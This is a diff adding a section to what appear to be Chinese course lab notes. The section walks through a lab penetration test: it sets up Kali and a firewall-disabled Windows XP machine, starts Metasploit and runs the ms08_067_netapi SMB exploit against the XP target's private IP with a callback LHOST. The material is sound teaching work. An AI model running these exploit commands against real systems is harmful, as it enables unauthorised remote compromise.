@@ -91,3 +91,49 @@
 
 **结果：AFL的模糊测试基本找出了我们给定代码中的一些漏洞。**
 
+
+
+# 239-16
+
+**步骤:**
+
+ 1. kali linux安装
+
+ 2. windows xp安装，然后手动关闭防火墙
+
+ 3. 在kali中用root启动终端，初始化并启动Metasploit：
+
+     1. ```shell
+        #显示系统中所有服务的状态
+        service --status-all
+        #启动并显示PostgreSQL服务
+        service postgresql start
+        service postgresql status
+        #初始化Metasploit框架的数据库msfdb
+        msfdb init
+        #启动Metasploit框架的控制台界面
+        msfconsole
+        #在Metasploit控制台界面中执行，用于显示数据库的状态
+        msf6 > db_status
+        ```
+
+ 4. 获得两机的ip地址，把网络都设为bridge模式，这样才能相互ping通
+
+ 5. 开始渗透测试：
+
+     1. kali中root模式，命令如下：
+
+        ```shell
+        use windows/smb/ms08_067_netapi
+        set RHOST 172.27.83.190   # 靶机IP
+        set LHOST 172.27.94.165  # Kali所在机IP
+        show targets #查看支持的操作系统 得到目标操作系统为34  Windows XP SP3 Chinese - Simplified (NX)
+        set Target 34 
+        exploit #开始渗透
+        ```
+
+        ![image-20251221135329300](/course/image-20251221135329300.png)
+
+        
+
+        
